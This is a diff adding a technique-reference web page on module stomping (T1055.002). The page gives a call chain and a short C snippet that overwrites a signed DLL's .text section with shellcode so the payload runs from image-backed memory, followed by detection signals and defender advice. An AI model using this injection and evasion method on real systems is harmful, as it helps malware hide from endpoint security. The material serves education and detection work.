@@ -1,0 +1,110 @@
+---
+title: Module Stomping
+mitre: T1055.002
+category: injection
+group: Image Replacement
+summary: Overwrite the .text section of a benign loaded DLL so your code sits in backed memory.
+platform: [Windows]
+tags: ['x64 / x86', 'C / C++']
+updated: '2026-06-30'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: LoadLibraryEx(a sacrificial DLL)
+    desc: Load a signed DLL the process does not actually use, remotely or in-process.
+    dll: kernel32
+  - call: locate the .text section
+    desc: Parse the mapped headers to find the executable section and its size.
+    dll: —
+  - call: VirtualProtectEx(PAGE_READWRITE)
+    desc: Make the image section writable — a copy-on-write fault privatises those pages.
+    dll: kernel32
+  - call: WriteProcessMemory
+    desc: Overwrite the section body with the payload.
+    dll: kernel32
+  - call: VirtualProtectEx(PAGE_EXECUTE_READ)
+    desc: Restore executable protection and jump into the stomped region.
+    dll: kernel32
+detections:
+  - src: MEMORY SCAN
+    text: Image-backed pages whose contents no longer match the file on disk — a section hash mismatch.
+  - src: ETW-TI
+    text: Protection change to RW on an image section, immediately followed by a change back to RX.
+  - src: SYSMON EID 7
+    text: A signed DLL loaded into a process with no legitimate reason to use it, then never called.
+  - src: BEHAVIOURAL
+    text: Threads whose start address lands mid-section in a module the process never imports from.
+related:
+  - mitre: T1620
+    title: Reflective DLL Loading
+    desc: Leaves unbacked memory; stomping exists to avoid exactly that artifact.
+    href: /techniques/injection/reflective-dll-loading
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Replaces the main image rather than a secondary module.
+    href: /techniques/injection/process-hollowing
+labKit:
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Every detection built on "executable memory with no file behind it" has the same blind spot: memory
+that *does* have a file behind it. Module stomping loads a legitimate signed DLL the target has no
+use for, then overwrites its `.text` section in place. The payload now executes from image-backed
+memory attributed to a Microsoft-signed module.
+
+The trade-off is that the stomped module is broken. Anything that calls into it will fault, so
+implementations pick a DLL the host process will never touch — and pick a different one per campaign,
+because the choice itself becomes a signature.
+
+<Callout type="caution">
+  Writing to an image section triggers copy-on-write. The pages become private to this process, which
+  is invisible to a naive backing check but plainly visible to a working-set walk that compares each
+  page against the file on disk.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="stomp.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// a signed DLL this process has no reason to call
+HMODULE mod = LoadLibraryExA("xpsservices.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
+
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)mod + ((PIMAGE_DOS_HEADER)mod)->e_lfanew);
+PIMAGE_SECTION_HEADER text = find_section(nt, ".text");
+PVOID dst = (PBYTE)mod + text->VirtualAddress;
+
+DWORD old;
+VirtualProtect(dst, size, PAGE_READWRITE, &old);   // copy-on-write privatises the pages
+memcpy(dst, shellcode, size);
+VirtualProtect(dst, size, PAGE_EXECUTE_READ, &old);
+
+((void(*)())dst)();`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The reliable check is content, not attribution: hash each executable image section in memory against
+the same section read from disk. Legitimate deltas exist — hot-patching, relocations, IAT entries —
+so normalise those before comparing rather than alerting on any difference.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
